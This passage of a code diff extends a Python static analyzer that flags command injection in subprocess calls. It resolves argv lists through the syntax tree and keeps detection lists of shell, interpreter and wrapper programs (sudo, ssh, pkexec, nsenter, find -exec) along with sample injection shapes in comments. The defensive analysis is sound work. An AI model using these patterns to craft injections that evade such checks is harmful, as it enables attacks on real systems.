+    `scope`, decide what the HEAD of the list is. Returns `("shell", None)` when it is, or
+    may be, a shell / wrapper / interpreter literal (the binding is then dropped and the
+    argv stays unresolved -> crit); `("lit", List)` with the literal prefix rebuilt from the
+    FIRST mutation when that is a straight-line statement of the scope body appending a
+    safe string-literal head; `("keep", None)` otherwise (flow unknown and no shell literal
+    appended -- today's behaviour).
+
+    Only the order of statements in the scope body is trusted: the lexically first mutation
+    is the head when it is itself a top-level statement (nothing can execute before it).
+    Otherwise the flow is uncertain and the list fails closed only when SOME mutation,
+    anywhere under the scope (nested functions included -- a closure may run first), appends
+    a shell/wrapper literal as the first element of its payload."""
+    top: set = set()
+    for st in getattr(scope, "body", ()):
+        if isinstance(st, ast.Expr) and isinstance(st.value, ast.Call):
+            top.add(id(st.value))
+        elif isinstance(st, ast.AugAssign):
+            top.add(id(st))
+    muts: list = []  # (lineno, col, payload elements, straight-line?, node id)
+    for n in ast.walk(scope):
+        payload = None
+        if (
+            isinstance(n, ast.Call)
+            and isinstance(n.func, ast.Attribute)
+            and n.func.attr in _TRAILING_ONLY_MUTATORS
+            and isinstance(n.func.value, ast.Name)
+            and n.func.value.id == name
+            and len(n.args) == 1
+            and not n.keywords
+        ):
+            arg = n.args[0]
+            if n.func.attr == "append":
+                payload = [arg]
+            elif isinstance(arg, (ast.List, ast.Tuple)):
+                payload = list(arg.elts)
+            else:
+                payload = [ast.Starred(value=arg, ctx=ast.Load())]
+        elif (
+            isinstance(n, ast.AugAssign)
+            and isinstance(n.target, ast.Name)
+            and n.target.id == name
+            and isinstance(n.op, ast.Add)
+        ):
+            v = n.value
+            payload = list(v.elts) if isinstance(v, (ast.List, ast.Tuple)) else [
+                ast.Starred(value=v, ctx=ast.Load())
+            ]
+        if payload is not None:
+            muts.append(
+                (getattr(n, "lineno", 0), getattr(n, "col_offset", 0), payload, id(n) in top, id(n))
+            )
+    if not muts:
+        return "keep", None
+    muts.sort(key=lambda m: (m[0], m[1]))
+
+    def _lit_head(payload: list) -> "ast.Constant | None":
+        h = payload[0] if payload else None
+        return h if isinstance(h, ast.Constant) and isinstance(h.value, str) else None
+
+    first = muts[0]
+    head = _lit_head(first[2])
+    # a mutation inside a nested scope (a closure) may run before the first own one; an own
+    # conditional one that is lexically later cannot
+    own = {id(n) for n in _scope_own_nodes(scope)}
+    nested_shell = any(
+        (h := _lit_head(m[2])) is not None and _prog_name_could_become_shell_indirect([h])
+        for m in muts
+        if m[4] not in own
+    )
+    # B-1042 hardening: a mutation outside the scope's own statements (closure, lambda,
+    # comprehension, class body) or ANY argv[0]-invalidating write anywhere under the scope
+    # (clear/insert/pop/remove/reverse/sort/slice or index assignment, `del name[...]`, the
+    # dunder / `list.<mutator>(name, ...)` spellings) means the rebuilt prefix cannot be
+    # trusted: never claim a literal head then
+    comp_ids = {
+        id(x)
+        for c in ast.walk(scope)
+        if isinstance(c, (ast.ListComp, ast.SetComp, ast.DictComp, ast.GeneratorExp))
+        for x in ast.walk(c)
+    }  # a comprehension is its own scope too
+    nested_mut = any(m[4] not in own or m[4] in comp_ids for m in muts)
+    invalidated = False
+    for n in ast.walk(scope):
+        if isinstance(n, ast.Call) and name in _call_mutates_list_head(n):
+            invalidated = True
+        elif (
+            isinstance(n, ast.Subscript)
+            and isinstance(n.value, ast.Name)
+            and n.value.id == name
+            and isinstance(n.ctx, (ast.Store, ast.Del))
+        ):
+            invalidated = True
+        elif (
+            isinstance(n, ast.AugAssign)
+            and isinstance(n.target, ast.Subscript)
+            and isinstance(n.target.value, ast.Name)
+            and n.target.value.id == name
+        ):
+            invalidated = True
+    if first[3] and head is not None and not nested_shell and not nested_mut and not invalidated:
+        # the literal prefix: the straight-line mutations from the first one up to the
+        # first conditional one (a python head is only safe once a script / `-m mod`
+        # element has closed its option list, B-1018)
+        prefix: list = []
+        for m in muts:
+            if not m[3]:
+                break
+            prefix.extend(m[2])
+        if _prog_name_could_become_shell_indirect(prefix):
+            return "shell", None
+        return "lit", ast.List(elts=prefix, ctx=ast.Load())
+    if any(
+        (h := _lit_head(m[2])) is not None and _prog_name_could_become_shell_indirect([h])
+        for m in muts
+    ):
+        return "shell", None
+    return "keep", None
+
+
+def _single_list_bindings_local(
+    scope: ast.AST, conditional_out: "dict | None" = None
+) -> dict[str, ast.List | ast.Tuple]:
     """Names bound EXACTLY ONCE, UNCONDITIONALLY, to a list/tuple literal within
     `scope`'s own body, with no later mutation this function cannot prove leaves the
     recorded literal still accurate (`cmd[0] = ...` / `cmd.insert(...)` / a shell-
@@ -3803,6 +4552,12 @@ def _single_list_bindings_local(scope: ast.AST) -> dict[str, ast.List | ast.Tupl
     `tests/test_b863_tt5_wrapper_position_grammar.py`'s
     `test_call_site_merges_conditional_append_branches_sharing_one_a0` and
     `test_call_site_merges_many_independent_conditional_branches`.
+
+    B-1018: when `conditional_out` is a dict, every name rejected ONLY by the B-952
+    "conditionally reached" rule (bound once, to a literal, nothing else disqualifying)
+    is recorded there as `name -> Assign`. It is NOT a scope-wide binding; the caller
+    may apply it only to a sink that the assignment dominates -- see
+    `_assign_dominates`.
     """
     if isinstance(scope, (ast.Module, ast.FunctionDef, ast.AsyncFunctionDef)):
         stack = [b for b in scope.body if not isinstance(b, _NESTED_SCOPE_NODES)]
@@ -3830,6 +4585,7 @@ def _single_list_bindings_local(scope: ast.AST) -> dict[str, ast.List | ast.Tupl
     # textual/execution order), so the decision is deferred to a second pass below,
     # once `bindings` is complete.
     trailing_mutated: set[str] = set()
+    conditional: dict = {}  # B-1018: name -> its one conditionally-reached literal Assign
     for n in _scope_own_nodes(scope):
         if isinstance(n, ast.Assign):
             for t in n.targets:
@@ -3837,6 +4593,10 @@ def _single_list_bindings_local(scope: ast.AST) -> dict[str, ast.List | ast.Tupl
                     assign_count[t.id] = assign_count.get(t.id, 0) + 1
                     if n not in unconditional_assigns:
                         unsafe.add(t.id)  # B-952: only conditionally reached
+                        if len(n.targets) == 1 and isinstance(n.value, (ast.List, ast.Tuple)):
+                            conditional[t.id] = n
+                        else:
+                            conditional[t.id] = None  # not a single literal binding
                     elif isinstance(n.value, (ast.List, ast.Tuple)):
                         bindings[t.id] = n.value
                     else:
@@ -3845,22 +4605,179 @@ def _single_list_bindings_local(scope: ast.AST) -> dict[str, ast.List | ast.Tupl
                     unsafe.add(t.value.id)  # cmd[0] = ... could replace the program
         elif isinstance(n, ast.Call):
             f = n.func
+            unsafe |= _call_mutates_list_head(n)  # B-1042: dunder / list.<mutator>(name, ...)
             if isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name):
                 if f.attr in _ARGV0_INVALIDATING_MUTATORS:
                     unsafe.add(f.value.id)  # could change/remove whatever is at index 0
                 elif f.attr in _TRAILING_ONLY_MUTATORS:
                     trailing_mutated.add(f.value.id)
+        elif isinstance(n, ast.Delete):
+            for t in n.targets:  # B-1042: `del cmd[0]` drops index 0
+                if isinstance(t, ast.Subscript) and isinstance(t.value, ast.Name):
+                    unsafe.add(t.value.id)
         elif (
             isinstance(n, ast.AugAssign)
             and isinstance(n.target, ast.Name)
             and isinstance(n.op, ast.Add)
         ):
             trailing_mutated.add(n.target.id)  # cmd += [...] mutates like .extend()
+        elif (
+            isinstance(n, ast.AugAssign)
+            and isinstance(n.target, ast.Subscript)
+            and isinstance(n.target.value, ast.Name)
+        ):
+            unsafe.add(n.target.value.id)  # B-1042: `cmd[0] += "x"`
+    for name in sorted(trailing_mutated):
+        # B-1042: `a = []` whose HEAD arrives through `.append`/`.extend`/`+=`
+        empty = bindings.get(name)
+        if empty is not None and not empty.elts:
+            verdict, rebuilt = _b1042_appended_head(scope, name)
+            if verdict == "shell":
+                unsafe.add(name)
+                conditional[name] = None
+                continue
+            if rebuilt is not None:
+                bindings[name] = rebuilt
     for name in trailing_mutated:
         lit = bindings.get(name)
+        if lit is None and conditional.get(name) is not None:
+            lit = conditional[name].value
         if lit is not None and _prog_name_could_become_shell_indirect(lit.elts):
             unsafe.add(name)
+            conditional[name] = None
+    if conditional_out is not None:
+        # Rejected only by B-952: bound exactly once, to a literal, with no
+        # disqualifying mutation (every other rule above put the name in `unsafe`
+        # through a path that also cleared or never set its `conditional` entry, or
+        # that is re-checked here).
+        #
+        # Accepted §2.5 residual (B-1018 row 4, folded into the TT5
+        # configured-executable residual), Dave ruling 2026-11-04: the
+        # `assign_count == 1` gate below deliberately leaves a command list that is
+        # CONDITIONALLY REBOUND behind a re-exec prefix unresolved, so it stays
+        # TT5_CMD_INJECTION crit. Real target: Anthropic's xlsx skill,
+        # scripts/recalc.py:217 -- `cmd = ["soffice", ...]`, then
+        # `if linux: cmd = ["timeout", str(t)] + cmd` /
+        # `elif darwin: cmd = ["gtimeout", str(t)] + cmd`, then `subprocess.run(cmd)`.
+        # A sound resolution needs two things this single-pass analyzer does not
+        # have, and C-135 on B-1018 found no cheap split: (1) a merge over EVERY
+        # reaching definition (three here, each self-referential), and (2) the
+        # option grammar of each prefix program -- `timeout -s SIG -k DUR
+        # --foreground DURATION CMD...` -- to find which word is the real program,
+        # then recursion into the inner binding. Clearing it without (2) would also
+        # clear `cmd = ["bash", "-c", x]; if y: cmd = ["timeout", "5"] + cmd`, a
+        # real command injection; (2) is the per-program flag-table enumeration
+        # that failed twice (B-996, B-986). Disclosed in B13's `fix` text (the TT5
+        # bucket in checks/_vet.py), never `detail`; pinned by
+        # tests/test_fleetfp_tt5_configured_executable_residual.py.
+        for name, a in conditional.items():
+            if a is None or assign_count.get(name, 0) != 1:
+                continue
+            # Only a literal string program: the resolver's argv[0] taint test reads
+            # names and env reads, not every source (an inline `sys.argv[1]` argv[0]
+            # reads as untainted -- a pre-existing gap this must not widen).
+            head = a.value.elts[0] if a.value.elts else None
+            if not (isinstance(head, ast.Constant) and isinstance(head.value, str)):
+                continue
+            if _b1018_other_unsafe(scope, name, a):
+                continue
+            conditional_out[name] = a
     return {k: v for k, v in bindings.items() if assign_count.get(k, 0) == 1 and k not in unsafe}
+
+
+def _b1018_other_unsafe(scope: ast.AST, name: str, assign: ast.Assign) -> bool:
+    """B-1018: may anything OTHER than `assign` rebind, unbind or reach into `name`?
+
+    Re-derived here rather than read from `unsafe`, which B-952 already set for this
+    name, so the B-952 reason cannot mask a second, real one. Deliberately broad: ANY
+    store or delete of the name except `assign`'s own target and a `+=` (a trailing
+    mutation, judged by B-953 like `.extend()`) -- that covers tuple/list unpacking,
+    `for`/`with`/walrus/`except ... as` targets and `del` in one rule -- plus any
+    `global`/`nonlocal` declaration of it anywhere under `scope`, nested functions
+    included (a function that declares it global can rebind it between the assignment
+    and the sink; C-135 round 1), plus index assignment and the argv[0]-invalidating
+    mutators."""
+    own_target = assign.targets[0]
+    for n in ast.walk(scope):
+        if isinstance(n, (ast.Global, ast.Nonlocal)) and name in n.names:
+            return True
+    for n in _scope_own_nodes(scope):
+        if isinstance(n, ast.Name) and n.id == name and isinstance(n.ctx, (ast.Store, ast.Del)):
+            if n is own_target:
+                continue
+            return True  # anything else that binds or unbinds the name
+        if isinstance(n, ast.AugAssign) and isinstance(n.target, ast.Name) \
+                and n.target.id == name and not isinstance(n.op, ast.Add):
+            return True
+        if isinstance(n, ast.ExceptHandler) and n.name == name:
+            return True
+        # `match` capture patterns bind through a plain string attribute, not an
+        # ast.Name (class names, so this stays importable on Python 3.9).
+        cls = n.__class__.__name__
+        if cls in ("MatchAs", "MatchStar") and getattr(n, "name", None) == name:
+            return True
+        if cls == "MatchMapping" and getattr(n, "rest", None) == name:
+            return True
+        if isinstance(n, (ast.Import, ast.ImportFrom)) and any(
+            (a.asname or a.name.split(".")[0]) == name for a in n.names
+        ):
+            return True
+        if (
+            isinstance(n, ast.Subscript)
+            and isinstance(n.value, ast.Name)
+            and n.value.id == name
+            and isinstance(n.ctx, (ast.Store, ast.Del))
+        ):
+            return True
+        if isinstance(n, ast.Call):
+            f = n.func
+            if (
+                isinstance(f, ast.Attribute)
+                and isinstance(f.value, ast.Name)
+                and f.value.id == name
+                and f.attr in _ARGV0_INVALIDATING_MUTATORS
+            ):
+                return True
+            if name in _call_mutates_list_head(n):  # B-1042: dunder / list.<mutator>(name, ...)
+                return True
+        if isinstance(n, ast.Delete) and any(
+            isinstance(t, ast.Subscript) and isinstance(t.value, ast.Name) and t.value.id == name
+            for t in n.targets
+        ):
+            return True
+    return False
+
+
+def _assign_dominates(assign: ast.Assign, call: ast.Call, parents: dict) -> bool:
+    """B-1018: is `assign` guaranteed to have run whenever `call` runs?
+
+    True only when `assign` and an ancestor statement of `call` sit in the SAME
+    statement list (a `try:` body, an `if` branch, a loop body, ...) with the ancestor
+    strictly AFTER `assign`. Python has no jump INTO the middle of a block, so control
+    reaching that later statement passed through `assign` first, in the same
+    execution of the block. An except handler, `finally`, `else`, or code after the
+    whole compound statement is a different list and never qualifies -- the B-952
+    case (assigned in a branch, used outside it) stays unresolved."""
+    a_parent = parents.get(assign)
+    if a_parent is None:
+        return False
+    for field in ("body", "orelse", "finalbody", "handlers"):
+        block = getattr(a_parent, field, None)
+        if isinstance(block, list) and any(x is assign for x in block):
+            break
+    else:
+        return False
+    a_idx = next(i for i, x in enumerate(block) if x is assign)
+    node = call
+    while node is not None:
+        par = parents.get(node)
+        if par is a_parent:
+            for i, x in enumerate(block):
+                if x is node:
+                    return i > a_idx
+            return False  # an ancestor in another field of the same compound statement
+        node = par
+    return False
 
 
 def _list_bindings_by_call(tree: ast.AST) -> dict[ast.Call, dict[str, ast.List | ast.Tuple]]:
@@ -3872,10 +4789,20 @@ def _list_bindings_by_call(tree: ast.AST) -> dict[ast.Call, dict[str, ast.List |
         n for n in ast.walk(tree) if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
     ]
     for scope in scopes:
-        binds = _single_list_bindings_local(scope)
+        conditional: dict = {}
+        binds = _single_list_bindings_local(scope, conditional)
+        parents: dict = {}
+        if conditional:
+            for n in _scope_own_nodes(scope):
+                for child in ast.iter_child_nodes(n):
+                    parents[child] = n
         for n in _scope_own_nodes(scope):
             if isinstance(n, ast.Call):
-                out[n] = binds
+                extra = {
+                    name: a.value for name, a in conditional.items()
+                    if _assign_dominates(a, n, parents)
+                }
+                out[n] = {**binds, **extra} if extra else binds
     return out
 
 
@@ -4066,7 +4993,28 @@ _SHELL_EVAL_FLAG_INTERPRETERS = frozenset({
     "python", "python2", "python3", "perl", "ruby", "php", "node", "deno",
 })
 _EVAL_FLAG_NAMES = frozenset({"-c", "-e", "--eval", "/c", "-command", "--command"})
-_REEXEC_WRAPPER_NAMES = frozenset({"env", "sudo", "doas", "nohup", "ssh"})
+_REEXEC_WRAPPER_NAMES = frozenset({
+    "env", "sudo", "doas", "nohup", "ssh",
+    # B-1021: more programs whose usage line is "[options] ... COMMAND [ARG]...", read
+    # from each tool's own `--help` (coreutils, util-linux, findutils, procps, polkit,
+    # busybox). Like env/sudo above they are matched on argv[0] alone, WITHOUT parsing
+    # their option grammar: every later element counts as command position, so a
+    # tainted `sh -c` string, a tainted program word, or a tainted word that only LOOKS
+    # like a wrapper option all convict. That is deliberately fail-closed -- a per-tool
+    # option table is the enumerative shape B-996/B-986 retracted -- and it over-
+    # approximates the same way env/sudo always have: `["timeout", "30", "git",
+    # "clone", url]` with a tainted url reads as command injection, not argument
+    # injection. Measured 2026-11-05: the only real-fleet Python argv list headed by any
+    # of these names is the xlsx recalc.py `timeout`/`gtimeout` prefix, which is
+    # already the accepted B-1018 row-4 residual (crit before and after).
+    "timeout", "gtimeout", "nice", "ionice", "stdbuf", "setsid", "xargs", "busybox",
+    "chroot", "taskset", "flock", "chrt", "unshare", "nsenter", "runuser", "setpriv",
+    "prlimit", "pkexec", "su", "time", "watch",
+})
+# B-1021: `find` runs a program only behind one of these actions (`find PATH... -exec
+# CMD ... ;`), so -- like an interpreter's eval flag -- it is shell-indirect only when
+# one of them is literally present in the same argv.
+_FIND_EXEC_ACTIONS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
 
 
 def _argv0_is_shell_indirect_exec(elts: list) -> bool:
@@ -4083,9 +5031,16 @@ def _argv0_is_shell_indirect_exec(elts: list) -> bool:
     prog = elts[0]
     if not isinstance(prog, ast.Constant) or not isinstance(prog.value, str):
         return False
-    basename = prog.value.rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()
+    basename = _argv0_basename(prog.value)
     if basename in _REEXEC_WRAPPER_NAMES:
         return True
+    if basename == "find":
+        return any(
+            isinstance(e, ast.Constant)
+            and isinstance(e.value, str)
+            and e.value.lower() in _FIND_EXEC_ACTIONS
+            for e in elts[1:]
+        )
     if basename in _SHELL_EVAL_FLAG_INTERPRETERS:
         return any(
             isinstance(e, ast.Constant)
@@ -4145,12 +5100,21 @@ def _all_call_sites_bind_fixed_argv(
             binds = scope_bindings.get(owner_map.get(expr))
             if binds:
                 resolved = binds.get(expr.id, expr)  # resolve a var-bound command list
+        # B-1071: `run(["kubectl", "exec", pod] + ["ls"])` -- the call-site twin of
+        # B-1018's sink-side `["prog"] + rest`. `+` on a list never changes index 0, so
+        # argv[0] is the head literal's first element; every other operand is kept as
+        # one more argv element so the taint checks below still see it.
+        concat = _b1071_concat_with_literal_head(resolved)
+        if concat is not None:
+            resolved = concat
         if not isinstance(resolved, (ast.List, ast.Tuple)) or not resolved.elts:
             return False  # unresolvable or empty -- not provably a fixed command
         prog = resolved.elts[0]
         visible = _tainted_names_visible(expr, ext_taint_map, owner_map, parent_scope, shadow_cache)
         if (_names_in(prog) & visible) or (ref_res is not None and ref_res.source_in(prog)):
             return False  # tainted program name at THIS call site -> stays crit
+        if _b1071_inline_source_in(prog):
+            return False  # B-1071: inline argv/input() read as the program -> stays crit
         if _argv0_is_shell_indirect_exec(resolved.elts):
             rest_names = set()
             for elt in resolved.elts[1:]:
@@ -4159,7 +5123,72 @@ def _all_call_sites_bind_fixed_argv(
                 ref_res is not None and any(ref_res.source_in(e) for e in resolved.elts[1:])
             ):
                 return False  # tainted arg handed to a shell/interpreter -> stays crit
+            if any(_b1071_inline_source_in(e) for e in resolved.elts[1:]):
+                return False  # B-1071: inline argv/input() handed to a shell -> stays crit
     return True
+
+
+def _b1071_inline_source_in(node: "ast.AST | None") -> bool:
+    """B-1071 (fail-closed companion): True if `node` spells a process-input read
+    inline -- any `.argv` attribute or bare `argv` name (`sys.argv[1]`, `s.argv`,
+    `from sys import argv; argv[1]`) or a call to `input`/`raw_input`. Name-set taint
+    (`_names_in(...) & visible`) cannot see these: the read is an expression, not a
+    tainted variable. Used only to REFUSE a call-site argv[0] as "provably fixed"; it
+    can never clear anything."""
+    if node is None:
+        return False
+    for n in ast.walk(node):
+        if isinstance(n, ast.Attribute) and n.attr == "argv":
+            return True
+        if isinstance(n, ast.Name) and n.id == "argv":
+            return True
+        if (
+            isinstance(n, ast.Call)
+            and isinstance(n.func, ast.Name)
+            and n.func.id in ("input", "raw_input")
+        ):
+            return True
+    return False
+
+
+def _b1071_concat_with_literal_head(expr: ast.AST) -> "ast.List | None":
+    """B-1071: flatten a left-leaning `+` chain whose leftmost operand is a non-empty
+    list/tuple LITERAL into one ast.List (head literal's elements, then each right
+    operand as one opaque element). Returns None for any other shape.
+
+    Fail-closed: the head's argv[0] must be a plain string constant that can never
+    become a shell / interpreter / re-exec wrapper (`_prog_name_could_become_shell_
+    indirect`, B-1018/B-1021) -- `["bash"] + rest` or `["env"] + rest` stay None, so
+    the caller keeps its crit default. A Starred head element, a non-literal head
+    (Name, Call, BinOp of something else) or a `*`/`-`/other operator is None too."""
+    chain = []
+    node = expr
+    while isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
+        chain.append(node.right)
+        node = node.left
+    if not chain or not isinstance(node, (ast.List, ast.Tuple)) or not node.elts:
+        return None
+    # Every right operand must itself be a list/tuple DISPLAY: anything else (a Name,
+    # Call, Subscript, ...) could be an object whose `__radd__` (or a list subclass,
+    # whose reflected method runs first) returns an arbitrary argv, program included.
+    if not all(isinstance(r, (ast.List, ast.Tuple)) for r in chain):
+        return None
+    # C-135 (B-1071 round 1): the appended TAIL must be fully literal strings. A head
+    # such as `kubectl exec <pod>` / `docker exec <c>` / `git -c` / a versioned
+    # interpreter re-executes or interprets what follows it, so `[... "exec", c] +
+    # ["sh", "-c", tainted]` must stay crit; only the head display may carry taint,
+    # which is exactly the plain-list call-site policy this mirrors.
+    if not all(
+        isinstance(e, ast.Constant) and isinstance(e.value, str)
+        for r in chain for e in r.elts
+    ):
+        return None
+    head = node.elts[0]
+    if not (isinstance(head, ast.Constant) and isinstance(head.value, str)):
+        return None
+    if _prog_name_could_become_shell_indirect(node.elts):
+        return None
+    return ast.List(elts=[*node.elts, *reversed(chain)], ctx=ast.Load())
 
 
 def _name_rebound_anywhere(tree: ast.AST, name: str) -> bool:
@@ -5246,6 +6275,11 @@ def _b863_resolve_call_site(expr, tree, owner_map):
     elts) for a Name resolved this way, or ("unresolvable", None)."""
     if isinstance(expr, (ast.List, ast.Tuple)) and expr.elts and not isinstance(expr.elts[0], ast.Starred):
         return "literal", list(expr.elts)
+    # B-1071: `run(["kubectl", "exec", pod] + ["ls"])` -- a literal-headed `+` chain
+    # with a fixed, non-shell argv[0] (see `_b1071_concat_with_literal_head`).
+    concat = _b1071_concat_with_literal_head(expr)
+    if concat is not None:
+        return "literal", list(concat.elts)
     if isinstance(expr, ast.Name):
         owner = owner_map.get(expr)
         scope = owner if owner is not None else None
@@ -5570,6 +6604,16 @@ def _b863_tier1_tier2_verdict(
     resolved_sites = [_b863_resolve_call_site(expr, tree, owner_map) for expr in call_sites]
     if any(rkind == "unresolvable" for rkind, _ in resolved_sites):
         return True  # unresolvable call site -- crit, as today
+    # B-1071: an inline argv/input() read as a call site's program is crit, whatever
+    # the body does (name-set taint below cannot see an expression-level read).
+    if any(elts and _b1071_inline_source_in(elts[0]) for _, elts in resolved_sites):
+        return True
+    if any(
+        elts and _argv0_is_shell_indirect_exec(elts)
+        and any(_b1071_inline_source_in(e) for e in elts[1:])
+        for _, elts in resolved_sites
+    ):
+        return True
 
     if kind == "none":
         return None
@@ -5600,6 +6644,193 @@ def _b863_tier1_tier2_verdict(
             if _b863_shape_triggers_crit(sh, elts, call_site_visible, body_visible, tree):
                 return True
     return False
+
+
+def _b1041_head_kind(value: ast.AST, name: str) -> "str | None":
+    """B-1041: how does assigning `value` to `name` treat the command list's HEAD? `"lit"`:
+    a non-empty list/tuple literal whose first element is a string constant that cannot
+    become a shell / wrapper (`_prog_name_could_become_shell_indirect`); `"self"`:
+    `name + ...` (head kept, whatever the earlier assignments made it); a `<head-kind> +
+    anything` concatenation is its left operand's kind; None: anything else."""
+    if isinstance(value, (ast.List, ast.Tuple)):
+        if (
+            value.elts
+            and isinstance(value.elts[0], ast.Constant)
+            and isinstance(value.elts[0].value, str)
+            and not _prog_name_could_become_shell_indirect(value.elts)
+        ):
+            return "lit"
+        return None
+    if isinstance(value, ast.Name):
+        return "self" if value.id == name else None
+    if isinstance(value, ast.BinOp) and isinstance(value.op, ast.Add):
+        return _b1041_head_kind(value.left, name)
+    return None
+
+
+_PARENT_MAP_CACHE: "weakref.WeakKeyDictionary" = weakref.WeakKeyDictionary()
+
+
+def _parent_map(tree: ast.AST) -> dict:
+    cached = _PARENT_MAP_CACHE.get(tree)
+    if cached is None:
+        cached = {c: n for n in ast.walk(tree) for c in ast.iter_child_nodes(n)}
+        _PARENT_MAP_CACHE[tree] = cached
+    return cached
+
+
+_B1041_OPAQUE_SCOPES = (
+    ast.Lambda, ast.ListComp, ast.SetComp, ast.DictComp, ast.GeneratorExp, ast.ClassDef,
+)
+
+
+def _b1041_binding_scope(node: ast.Call, tree: ast.AST) -> "ast.AST | None":
+    """B-1041: the Module or FunctionDef whose own body holds `node` -- the scope that
+    binds every bare name the call reads -- or None when the call sits in a lambda,
+    comprehension or class body, or in a decorator / default / annotation of a def (code
+    that runs in the ENCLOSING scope but hangs off the def's subtree). The first scope
+    boundary above the call is the answer, so no nested scope can lie between them."""
+    parents = _parent_map(tree)
+    child, cur = node, parents.get(node)
+    while cur is not None:
+        if isinstance(cur, _B1041_OPAQUE_SCOPES):
+            return None
+        if isinstance(cur, (ast.FunctionDef, ast.AsyncFunctionDef)):
+            return cur if any(child is b for b in cur.body) else None
+        if isinstance(cur, ast.Module):
+            return cur
+        child, cur = cur, parents.get(cur)
+    return None
+
+
+def _b1041_uses_are_plain(scope: ast.AST, name: str) -> bool:
+    """B-1041: is EVERY mention of `name` under `scope` (nested scopes included) one of: a
+    plain store handled by the caller (assignment / `+=` target), an argument of an
+    exec-sink call, the receiver of `.append(...)` / `.extend(...)`, or the left operand of
+    `+`? Anything else -- aliasing (`x = name`), passing it to another call (`setitem(name,
+    ...)`, `f(name)`), a container, another attribute (`name.insert`, `name.__setitem__`,
+    `name.copy`), a subscript or slice (read, write or `del`), iteration -- might let the
+    head change behind the analysis, so the carve-out refuses."""
+    parents = {c: n for n in ast.walk(scope) for c in ast.iter_child_nodes(n)}
+    for n in ast.walk(scope):
+        if not (isinstance(n, ast.Name) and n.id == name):
+            continue
+        if isinstance(n.ctx, (ast.Store, ast.Del)):
+            par = parents.get(n)
+            if isinstance(n.ctx, ast.Del) or not isinstance(par, (ast.Assign, ast.AugAssign)):
+                return False
+            continue  # a direct Assign / AugAssign target: judged by the caller
+        par = parents.get(n)
+        if isinstance(par, ast.Attribute) and par.value is n:
+            call = parents.get(par)
+            if not (
+                par.attr in _TRAILING_ONLY_MUTATORS
+                and isinstance(call, ast.Call)
+                and call.func is par
+            ):
+                return False
+            continue
+        if isinstance(par, ast.BinOp) and isinstance(par.op, ast.Add) and par.left is n:
+            continue
+        if isinstance(par, ast.keyword):
+            par = parents.get(par)
+            if isinstance(par, ast.Call) and _is_exec_sink_call(par.func)[0]:
+                continue
+            return False
+        if isinstance(par, ast.Call) and n in par.args and _is_exec_sink_call(par.func)[0]:
+            continue
+        return False
+    return True
+
+
+def _b1041_name_keeps_fixed_head(scope: ast.AST, name: str, tree: ast.AST) -> bool:
+    """B-1041: is `name`, in `scope`, bound ONLY to command lists whose head is one fixed
+    program that is never a shell / wrapper, so the head is known safe whichever branch ran?
+
+    True only when every store of the name in the scope's own body is a plain
+    `name = <list literal | name + ... | literal + ...>` (`_b1041_head_kind`) or a
+    `name += ...` (which never touches index 0), at least one of them a literal head, and
+    nothing else can change index 0: the name is not a parameter, no `global`/`nonlocal`
+    declares it, no `for`/`with`/walrus/unpack/`except`/`match`/import binds or `del`s it, no
+    star-import can supply it, and no index assignment or argv[0]-invalidating mutator
+    (`.insert/.remove/.pop/.clear/.sort/.reverse`) touches it ANYWHERE under the scope,
+    nested functions included. Any non-literal or shell-capable assignment -> False, which
+    keeps the unresolved-argv crit default (B-952's reason the name is not a single binding
+    at all: the branch that skips an assignment leaves the earlier value, and here every
+    earlier value has the same fixed head)."""
+    if isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef)):
+        a = scope.args
+        params = [*a.posonlyargs, *a.args, *a.kwonlyargs, a.vararg, a.kwarg]
+        if any(x is not None and x.arg == name for x in params):
+            return False
+    for n in ast.walk(scope):
+        if isinstance(n, (ast.Global, ast.Nonlocal)) and name in n.names:
+            return False
+        if isinstance(n, ast.Call):
+            f = n.func
+            if (
+                isinstance(f, ast.Attribute)
+                and isinstance(f.value, ast.Name)
+                and f.value.id == name
+                and f.attr in _ARGV0_INVALIDATING_MUTATORS
+            ):
+                return False
+        if (
+            isinstance(n, ast.Subscript)
+            and isinstance(n.value, ast.Name)
+            and n.value.id == name
+            and isinstance(n.ctx, (ast.Store, ast.Del))
+        ):
+            return False
+    if any(
+        isinstance(n, ast.ImportFrom) and any(al.name == "*" for al in n.names)
+        for n in ast.walk(tree)
+    ):
+        return False  # a star-import can bind any name
+    if not _b1041_uses_are_plain(scope, name):
+        return False
+    own = list(_scope_own_nodes(scope))
+    ok_targets: set = set()
+    literal_seen = False
+    for n in own:
+        if isinstance(n, ast.Assign):
+            for t in n.targets:
+                if isinstance(t, ast.Name) and t.id == name:
+                    kind = _b1041_head_kind(n.value, name)
+                    if kind is None:
+                        return False
+                    literal_seen = literal_seen or kind == "lit"
+                    ok_targets.add(id(t))
+        elif (
+            isinstance(n, ast.AugAssign)
+            and isinstance(n.target, ast.Name)
+            and n.target.id == name
+        ):
+            if not isinstance(n.op, ast.Add):
+                return False
+            ok_targets.add(id(n.target))
+    for n in own:
+        if isinstance(n, ast.Name) and n.id == name and isinstance(n.ctx, (ast.Store, ast.Del)):
+            if id(n) not in ok_targets:
+                return False
+        elif isinstance(n, ast.ExceptHandler) and n.name == name:
+            return False
+        elif n.__class__.__name__ in ("MatchAs", "MatchStar") and getattr(n, "name", None) == name:
+            return False
+        elif n.__class__.__name__ == "MatchMapping" and getattr(n, "rest", None) == name:
+            return False
+        elif isinstance(n, (ast.Import, ast.ImportFrom)) and any(
+            (al.asname or al.name.split(".")[0]) == name for al in n.names
+        ):
+            return False
+    return literal_seen
+
+
+def _call_scope(node: ast.Call, owner_map: "dict | None", tree: ast.AST) -> ast.AST:
+    """The function a call sits in (per `owner_map`), else the module `tree` -- the scope
+    handed to the single-binding resolvers, same choice the sink loop makes."""
+    own = owner_map.get(node) if owner_map else None
+    return own if isinstance(own, (ast.FunctionDef, ast.AsyncFunctionDef)) else tree
 
 
 def _subprocess_taint_is_command_injection(
@@ -5709,6 +6940,38 @@ def _subprocess_taint_is_command_injection(
         first = first.args[0]
     if isinstance(first, ast.Name) and list_bindings:
         first = list_bindings.get(first.id, first)  # resolve a var-bound command list
+    # B-1018: `run(["soffice"] + args)` -- a literal list concatenated with anything.
+    # `+` on a list never changes index 0, so argv[0] is the left literal's first
+    # element. Only a plain string constant there is trusted, and never one that could
